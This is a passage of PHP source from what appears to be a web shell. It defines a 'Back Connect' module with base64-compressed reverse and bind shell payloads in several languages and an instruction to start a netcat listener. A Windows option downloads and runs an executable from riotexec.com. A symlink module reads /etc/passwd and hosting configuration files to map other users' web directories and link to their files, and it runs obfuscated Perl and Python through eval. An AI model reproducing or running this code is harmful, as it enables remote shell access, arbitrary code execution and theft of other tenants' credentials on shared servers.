        "lZLRjpNAFIav26TvMOJsC8kYWr1bpJFQ3DRrS8OwGmOVsPSsTKQDgVm3m+722Z0BVifGGL0755/Dd+Abnj+zb5vavmbcBv4dVVAXo+FtA2gZnp/TMvsGwhkNcdm4+EuoqiZ3DThUZS1QHEQr9yCg3jsbOnMnW7z5sNjOJ05/LkOnJTc5esEM+TS7MRXqtLfvZMysY4s788MV3QT+GbIvDedRLhHuVxBVXYry+p6nezAnIqsmliQ07SuZlIw3b5PlOojJmIb+ZULjKPBWBAvr4WHHwLS6bW+86OK9686s42g4wJWLVf9p+lmeDhoQilZWCkfDd4kCSSANkyi4ooG3WERkpkAD+RE7OaTG092uThg3cUWWazWSeOuPlrZ1ULBGAJfjr/Q0zTKQm3xCrW65JPrEOCGvuElRDOke0RyKAp223CDTdqisgCMaL5ZrYrwe+4bzFIRXMTHmehJEUZ/I5+AAGZJqtfVZUTZg+pbTFfRnoehaI8laJ6lWB2QCTWUlLweK5pfYl38Si/O+nXUtcxkHkaSilNpyXQpO3d+cYqafZyXnkKn7wamet/boP9gze3vzMTUs5ynp9elR709FfxP4f946W3BU+kz5Jz3+AA==";
    $ruby =
        "tVb7b9M6FP7Z+SuMN0hzVxLGQ+h2N6vGU0ggqjG4QmQXtc5pYy11gu3QoW387fiVrqXt1ivd66p1es7n8/T52p07SSNFMmI8Af4di2b0I9jBhVK17CXJhKmiGcW0miajR08fn7nPQMC3hgnAoazoGajwWlAPVcGHUwiDIIcxlg09kwESoBrB8fHHZ5+/Dt4enbx6f/wuzqsZp0MJ8XSoaNEJp3LG+KV5TxmfzMKor0QDvfGwlBAAz51FAcPSOOlIJSJtOdV7gNgYv2IlxHDOpJJ9r9TagY8n5jCz0rg1EKvqqw7NGDbHbaRYFcCxSEU8kc2ok2RJ0iVZRiJsYT4N4aLRh46OX3+KS+ATVaTpfoD1MqIvD07Tn8k/Xx7c//P0Yr/75Go36dfpG65gAqLjEVFPB6vsGZmePB98APEdhI2TkG4dWQ1NZTykFGoHpHEtGFeY2DZgWUBZ4h6mFedAFeQZJxY3ggnj9sksHSivlO8FXljjlJoqsCUhnAPF0voZdwic15VQ+OTl8bv0XIGYHgw+7Kdhtjv4+0V2GB54vRYe2DskC3yf4eyv7N7dHGeHdnvodtIdm1c09wamsYuu2/TmPSYxifbIIVlCzQrdaVzq2CeglhMySwyZBAxCVOKZqEzypWlGziAT/d1kBe+rU8a0qKZ1mhKyAvEwY4fmOP4jYWshZpVp6e+ORiasG4aRM7zxRHt1cz0/VFXiR79TRhvRzse8QLcgXzChvWvLNwHNZd6k264jCw31ZcpmvRvLtC5pV6etE7oN/p+mBRtNvXkf11UNvFN2iSDRxSWrLlvzrDJsk+8RPZd7K76ugm3D/l22+L19FiBpc33vNfnN6QW4bMR1BjKmZbWQkUw5K4PWluvhErE9tAS5gdi0o1VqO9DSIrXf9k81x5oC+oAc4TrGsz8ejvF2Loory3pIbsFxyBEcQkvUhhAaa760jIaMu/+byFCb2Tzo1QullS1hSUdYWoJuISkbP1rDTMjLF6nIytBm4kHtoTU0g9rDi4zihUvk4US2d3bdmLCty29MsDmKdpBX3S5r/o1z8Mh10ym3nM4lp353m/8zsHbgkJ82E6WbM/1kJwz58XKTZ8FG8gs=";
    $node =
        "nVHLasMwEDwrkH8QvliCoEDTW8ih9BPSW/pAtdeRQJZcSXYKIfn2yrKd5tGWYh+Ed2d2NDtquMWu4juNV9jCRy0tkDQTUuVvlTUZOJdSFgnL6aQJZA3+nBrKlPaQ8xZ4eY52nRMhM9oZBRdXda1I6VUEKBUo6fxd6rkTaUBkQXo3rFLcF8aWrOQ+E2T+ugssSen3XFbmDD4hPSlyu20CMCi0ZafZ/jEFeuvFarWg++kEtXwRyGEvlgXzHtZgG7CkqHXmpdHERR5ybGelB5Ic8YMqOH5qV19HD8dnnbT74P7rtgqiMUcSjZ7jTjDnc6mZBVeXQOg1ZGrPws1Jzj1PZoMTTNqa7gcnsVoebpXB2pHjf40Npm+mUXcKpqTzoGPKm7uXtnmYTkA5wNfZ35+ydxfZPxqtoYu9V5nF19wsotx/HgH9lj76IXY0Mm80Mmg0LuHDFw==";
    $c =
        "tVJtb9owEP7cSv0PHp1ap/WAsO0TTaWoZBLaChHJNE0bilLHNKcZG8Vmgk7rb98lBArZi/alUqzcPff47nzPnYLicpkJcmVsBrqdX58cn+5hBaj738BMwl0TXJuOXS+E+QNuNP8mbCOghAU8HVCNwFIBVqhAUJbMU1C0NNLinjOepwW5QPP7l6nz4+T4qIwYxpn23D662PCSI4IV0ywrElAEShxmtLzveb3q1hG0Dahkls5Brj3/XTIcBXH/KbDQhfVyq5WhqdVAq4Lu1HH2OGX+tql+FVXS4cgfDCaJP/q84Rlv83JaF2DR+OZ9EsWTwL9l3ZojbEnSC0sNxj8kJaeiJpPgYxSUGdmZZgYehJ5RvW1hRl8YR6zA0jrRHagMU9DGBMiFcwasu3JrmsThCoXEtxufeynnoqrefeoJU3HWeiS+nKUkFumcRLmQkjx+VS3We7MlZstFD4mHnnvg9eqUayw7py2xKkdL4mBy662sKOb9MHK985fhp8H1eb+OIoSm4KSDj+qYnLyCVt2t1EZQXjk/8QhpBNlp+/pZtC23tLI2zN60nveDKPQWYjh1iWPdMi7dy31kl/2fGzEMw8k4HifxTbgTmXKtlOD2r8rWe9GIOY5z1T1Yj0pT87+amobnHnjPoanZaorfLw==";
    $java =
        "lVRNb9swDD2nQP+D4JM9BG6T04bCwz6ww4ABHZbeuhwUhbG12rIg0XGCNPvtoz7sumsvPdiWyCfy8ZGybHRrkP3he57LNn93c3khJyYF6G2XF7rb1FIwUXNrGa93/A54c7q8mGkj9xyBWeRIgJ1UvI4wjQwOCGpr2V1lgG8dfjzwXekOV0j2hkl7M3Xddvjkazv0DMgdOGhMn5+dvziQnbCSNpe2oMh+ScbCRTqHUJ9u92CM3MIk7r6VW2Y6lWae5wzNMSxmmyPC/ZptWMEU9Mxv3y8+LNc3wS8VMkFOyuPKTDdZdPSVrCEVH4vrjMVYM2KR90YipJv59VwMUG/f1Z2t0tH0asyz/4S34Ciq9NtBgEbZKgbZCXJSUZEWXDzcGS6Awnmwe4XqY72xY77shkuVkn5SlVQoN6UNIrjK3Dj43MHPRLMlXsnVRqorWyXeJXfp6mgRmrwE/GlaDQaPadLaXPEGkizH9kfbg/nKLRHKpdrC4XaXJr1USebkOcWo9EkC35itd9a/7DONHHMzx1YV1DX7+1uFzJPe9C75F9rbKOGqFQ+ArIp9C9voG7tL1F29eQ2qxKooFrH9M38NCppThBJMrrmxQBuPvr9eD/1YgaFZiqnskGpiTF2gAe242JwL17Gh0aGXUFtg/5NZvpVMEE1qwnrXYj1JPBFB6jmb8Dq/LgV7fGSv85newFK6siun/sQ8jvGzy1m2I3ZqH8HkH27HYKJxEuB+J3TwV6dQNuCOxyVNExxApDQ4WfxPkFo0tYtYMOmsX1CbOyJDAodePqFL90fRLxmO8EVOV8e49unluHyS0b/ecDPpOf8D";
    echo "<div class=header><center><br><div class='txtfont_header'>| Back Connect |</div><br><br>";
    echo "<form onSubmit=\"g('connect',null,this.selectCb.value,this.server.value,this.port.value,this.cbmethod.value);return false;\">
<div class=\"txtfont\">Mehtod:</div> <select name='cbmethod' onChange='ctlbc(this);' style='width:120px;'><option value='back'>Reverse Shell</option><option value='bind'>Bind Port</option></select> <div class=\"txtfont\">Use:</div> <select name='selectCb'>";
    $cbArr = [
        "php" => "Php",
        "perl" => "Perl",
        "python" => "Python",
        "ruby" => "Ruby",
        "c" => "C",
        "java" => "Java",
        "node" => "NodeJs",
        "bcwin" => "Windows",
    ];
    foreach ($cbArr as $key => $val) {
        echo "<option value='{$key}' " . ($GLOBALS["sys"] == "win" ? "selected" : "") . ">{$val}</option>";
    }
    echo "</select> <div id='bcipAction' style='display:inline-block;'><div class=\"txtfont\">IP:</div> <input type='text' style='text-align:center;' name='server' value='" .
        $_SERVER["REMOTE_ADDR"] .
        "'></div> <div class=\"txtfont\">Port: </div> <input type='text' size='5' style='text-align:center;' name='port' value='2012'> <input type='submit' value=' '></form><p><div id='bcStatus'><small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small></div></p></center></b></font><br>";
    if (isset($_POST["riot1"]) && !empty($_POST["riot1"])) {
        $lang = $_POST["riot1"];
        $ip = $_POST["riot2"];
        $port = $_POST["riot3"];
        $arg = $_POST["riot4"] == "bind" ? $port : $port . " " . $ip;
        $tmpdir = ALFA_TEMPDIR;
        $name = $tmpdir . "/" . $lang . uniqid() . rand(1, 99999);
        $allow = ["perl", "ruby", "python", "node"];
        eval('$lan=$' . $lang . ";");
        if (in_array($lang, $allow)) {
            if (__write_file($name, __get_resource($lan))) {
                if (_riot_can_runCommand(true, true)) {
                    $os = $GLOBALS["sys"] != "win" ? "1>/dev/null 2>&1 &" : "";
                    $out = riotEx("$lang $name $arg $os");
                    if ($out == "") {
                        $out = "<font color='red'><center>[ Finished...! ]</center></font>";
                    }
                    echo "<pre class='ml1' style='margin-top:5px'>{$out}</pre>";
                }
            } else {
                echo "<pre class=ml1 style='margin-top:5px'><font color='red'><center>[ Failed...! ]</center></font></pre>";
            }
        }
        if ($lang == "java" || $lang == "c") {
            $code = __get_resource($lan);
            $out = nl2br(bcinit($lang, $code, "", ""));
            echo "<pre class=ml1 style='margin-top:5px'><center>{$out}</center></pre>";
        }
        if ($lang == "bcwin") {
            $riot = new AlfaCURL();
            $s = $riot->Send("http://riotexec.com/bc/windows.exe");
            $tmpdir = ALFA_TEMPDIR;
            $f = @fopen($tmpdir . "/bcwin.exe", "w+");
            @fwrite($f, $s);
            @fclose($f);
            $out = riotEx($tmpdir . "/bcwin.exe " . $_POST["riot2"] . " " . $_POST["riot3"]);
        }
        if ($lang == "php") {
            echo "<pre class=ml1 style='margin-top:5px'>";
            $code = __get_resource($lan);
            if ($code !== false) {
                $code = "\$target = \"" . $arg . "\";\n" . $code;
                eval($code);
                echo "<center><font color='red'>[ Finished...! ]</font></center>";
            }
            echo "</pre>";
        }
    }
    echo "</div>";
    riotfooter();
}
function riotMakePwd()
{
    if (_riot_file_exists("/etc/virtual/domainowners") || (_riot_file_exists("/etc/named.conf") && _riot_file_exists("/etc/valiases"))) {
        return "/home/{user}/public_html/";
    }
    $document = explode("/", $_SERVER["DOCUMENT_ROOT"]);
    $public = end($document);
    array_pop($document);
    array_pop($document);
    $path = implode("/", $document) . "/{user}/" . $public;
    return $path;
}
function riotGetDomains($state = false)
{
    $state = "named.conf";
    $lines = [];
    $lines = _riot_file("/etc/named.conf");
    if (!$lines) {
        $lines = @scandir("/etc/valiases/");
        $state = "valiases";
        if (!$lines) {
            $lines = @scandir("/var/named");
            $state = "named";
            if (!$lines && $state) {
                $lines = _riot_file("/etc/passwd");
                $state = "passwd";
            }
        }
    }
    return ["lines" => $lines, "state" => $state];
}
function riotCreateParentFolder()
{
    $parent = $GLOBALS["home_cwd"] . "/" . __SYS_CONFIG_FOLDER__;
    if (!@is_dir($parent)) {
        @mkdir($parent, 0755, true);
    }
}
function riotsymlink()
{
    riothead();
    AlfaNum(9, 10);
    riotCreateParentFolder();
    @chdir($GLOBALS["home_cwd"] . "/" . __SYS_CONFIG_FOLDER__);
    echo '<div class=header><br><center><div class="txtfont_header">| Symlink |</div><center><h3><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symphp\')">| Symlink( php ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symperl\')">| Symlink( perl ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'sympy\')">| Symlink( python ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,null,null,\'SymFile\')">| File Symlink | </a></h3></center>';
    if (isset($_POST["riot2"]) && ($_POST["riot2"] == "symperl" || $_POST["riot2"] == "sympy")) {
        $sympath = riotMakePwd();
        @mkdir("cgiriot", 0755);
        @chdir("cgiriot");
        riotcgihtaccess("cgi");
        $perl =
            "#!/usr/bin/perl   -I/usr/local/bandmin" .
            "\n" .
            'use MIME::Base64;use Compress::Zlib;my $riot_data="' .
            __SYS_CONFIG_FOLDER__ .
            '";eval(Compress::Zlib::memGunzip(decode_base64("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")));';
        $py =
            "#!/usr/bin/python" .
            "\nimport zlib, base64\nriot_data='" .
            __SYS_CONFIG_FOLDER__ .
            "'\n" .
            'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
        $cginame = "symperl.riot";
        $source = $perl;
        $lang = "perl";
        if ($_POST["riot2"] == "sympy") {
            $cginame = "pysymlink.riot";
            $source = $py;
            $lang = "python";
        }
        @__write_file($cginame, $source);
        @chmod($cginame, 0755);
        echo __pre();
        $resource = riotEx("{$lang} {$cginame} {$sympath}", false, true, true);
        if (strlen($resource) == 0) {
            echo AlfaiFrameCreator("cgiriot/" . $cginame);
        } else {
            echo $resource;
        }
    }
    if (isset($_POST["riot4"]) && $_POST["riot4"] == "SymFile") {
        if (function_exists("symlink") || _riot_can_runCommand(true, true)) {
            AlfaNum(9, 10);
            echo __pre() .
                '
<center><p><div class="txtfont_header">| Symlink File And Directory |</div></p><form onSubmit="g(\'symlink\',null,null,null,null,\'SymFile\',this.file.value,this.symfile.value,this.symlink.value);return false;" method="post">
<input type="text" name="file" placeholder="Example : /home/user/public_html/config.php" size="60"/><br />
<input type="text" name="symfile" placeholder="Example : riot.txt" size="60"/>
<p><input type="submit" value=" " name="symlink" /></p></form></center>';
            $path = $_POST["riot5"];
            $symname = $_POST["riot6"];
            $riotexec58 = $_POST["riot7"];
            if ($riotexec58) {
                $new_name = str_replace(".", "_", basename($symname));
                $rand_dir = $new_name . rand(111, 9999);
                $sym_dir = "riotsymlinkphp/" . $rand_dir . "/";
                @mkdir($sym_dir, 0777, true);
                riotcgihtaccess("sym", $sym_dir, $symname);
                _riot_symlink("$path", "$sym_dir/$symname");
                echo __pre();
                echo '<center><b><font color="white">Click >> </font><a target="_blank" href="' . __SYS_CONFIG_FOLDER__ . "/" . $sym_dir . '" ><b><font size="4">' . $symname . "</font></b></a></b></center>";
            }
        } else {
            echo "<center><pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";
        }
    }
    if (isset($_POST["riot2"]) && $_POST["riot2"] == "symphp") {
        $cant_symlink = true;
        if (function_exists("symlink") || _riot_can_runCommand(false, false)) {
            @mkdir("riotsymlink", 0777);
            riotcgihtaccess("sym", "riotsymlink/");
            _riot_symlink("/", "riotsymlink/root");
            $table_header =
                "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><table id='tbl_sympphp' align='center' width='40%' class='main' border='1'><td><span style='color:#FFFF01;'><b>*</span></b></td><td><span style='color:#00A220;'><b>Domains</span></b></td><td><span style='color:#FFFFFF;'><b>Users</span></b></td><td><span style='color:#4c1eba;'><b>symlink</span></b></td>";
            if (_riot_file_exists("/etc/named.conf") && !_riot_file_exists("/etc/virtual/domainowners") && _riot_file_exists("/etc/valiases/")) {
                echo "<center>";
                $lines = [];
                $anony_domains = [];
                $anonymous_users = [];
                $f_black = [];
                $error = false;
                $anonymous = false;
                $makepwd = "/home/{user}/public_html/";
                $domains = riotGetDomains();
                $lines = $domains["lines"];
                $state = $domains["state"];
                $is_posix = function_exists("posix_getpwuid") && function_exists("fileowner");
                $can_runcmd = _riot_can_runCommand(false, false);
                if (!$is_posix && !$can_runcmd) {
                    $anonymous = true;
                    $anony_domains = $domains["lines"];
                    $lines = _riot_file("/etc/passwd");
                }
                echo $table_header;
                $count = 1;
                $template =
                    '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="' .
                    __SYS_CONFIG_FOLDER__ .
                    '/riotsymlink/root{sympath}" target="_blank"><span style="color:#4c1eba;">Symlink</span></a></td></tr>';
                foreach ($lines as $line) {
                    $domain = "";
                    $owner = "";
                    if ($anonymous) {
                        $explode = explode(":", $line);
                        $owner = $explode[0];
                        $owner_len = strlen($owner) - 1;
                        $userid = $explode[2];
                        if ((int) $userid < 500) {
                            continue;
                        }
                        $domain = "[?????]";
                        $temp_black = [];
                        $finded = false;
                        foreach ($anony_domains as $anony) {
                            if ($state == "named.conf") {
                                if (@strstr($anony, "zone")) {
                                    preg_match_all('#zone "(.*)"#', $anony, $data);
                                    $domain = $data[1][0];
                                } else {
                                    continue;
                                }
                            } elseif ($state == "named" || $state == "valiases") {
                                if ($anony == "." || $anony == "..") {
                                    continue;
                                }
                                if ($state == "named") {
                                    $anony = rtrim($anony, ".db");
                                }
                                $domain = $anony;
                            }
                            $sub_domain = str_replace(["-", "."], "", $domain);
                            if (substr($owner, 0, $owner_len) == substr($sub_domain, 0, $owner_len)) {
                                if (in_array($owner . $domain, $temp_black)) {
                                    continue;
                                }
                                $sympath = str_replace("{user}", $owner, $makepwd);
                                $http = "http://" . $domain;
                                echo str_replace(["{count}", "{http}", "{domain}", "{owner}", "{sympath}"], [$count, $http, $domain, $owner, $sympath], $template);
                                $count++;
                                $temp_black[] = $owner . $domain;
                                $finded = true;
                            }
                        }
                        if (!$finded) {
                            $anonymous_users[] = $owner;
                        }
                    } else {
                        if ($state == "named.conf") {
                            if (@strstr($line, "zone")) {
                                preg_match_all('#zone "(.*)"#', $line, $data);
                                $domain = $data[1][0];
                            } else {
                                continue;
                            }
                        } elseif ($state == "named" || $state == "valiases") {
                            if ($line == "." || $line == "..") {
                                continue;
                            }
                            if ($state == "named") {
                                $line = rtrim($line, ".db");
                            }
                            $domain = $line;
                        }
                        if (strlen(trim($domain)) > 2 && $state != "passwd") {
                            if (!_riot_file_exists("/etc/valiases/" . $domain, false)) {
                                continue;
                            }
                            if ($is_posix) {
                                $user = @posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
                                $owner = $user["name"];
                            } elseif ($can_runcmd) {
                                $owner = riotEx("stat -c '%U' /etc/valiases/" . $domain, false, false);
                            }
                        }
                    }
                    if (!$anonymous) {
                        if (strlen($owner) == 0 || in_array($owner . $domain, $f_black)) {
                            continue;
                        }
                        $sympath = str_replace("{user}", $owner, $makepwd);
                        $http = "http://" . $domain;
                        if ($state == "passwd") {
                            $http = "javascript:alert('we cant find domain...')";
                        }
                        echo str_replace(["{count}", "{http}", "{domain}", "{owner}", "{sympath}"], [$count, $http, $domain, $owner, $sympath], $template);
                        $count++;
                        $f_black[] = $owner . $domain;
                    }
                }
                if ($anonymous) {
                    foreach ($anonymous_users as $owner) {
                        $sympath = str_replace("{user}", $owner, $makepwd);
                        $http = "javascript:alert('we cant find domain...')";
                        echo str_replace(["{count}", "{http}", "{domain}", "{owner}", "{sympath}"], [$count, $http, "[????]", $owner, $sympath], $template);
                        $count++;
                    }
                }
                $cant_symlink = false;
            } else {
                $is_direct = false;
                $makepwd = riotMakePwd();
                if (_riot_file_exists("/etc/virtual/domainowners")) {
                    $makepwd = "/home/{user}/public_html";
                    $is_direct = true;
                }
                $sole = _riot_file("/etc/virtual/domainowners");
                $count = 1;
                echo $table_header;
                $template =
                    '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="' .
                    __SYS_CONFIG_FOLDER__ .
                    '/riotsymlink/root{cwd}" target="_blank"><span style="color:#4c1eba;">Symlink</span></a></td></tr>';
                if ($sole) {
                    foreach ($sole as $visible) {
                        if (@strstr($visible, ":")) {
                            $riotexec = explode(":", $visible);
                            $cwd = str_replace("{user}", trim($riotexec[1]), $makepwd);
                            echo str_replace(["{count}", "{user}", "{url}", "{cwd}"], [$count++, trim($riotexec[1]), trim($riotexec[0]), $cwd], $template);
                        }
                    }
                } else {
                    $passwd = _riot_file("/etc/passwd");
                    if ($passwd) {
                        $html = "";
                        $is_named = false;
                        $users = [];
                        $domains = [];
                        $uknowns = [];
                        foreach ($passwd as $user) {
                            $user = trim($user);
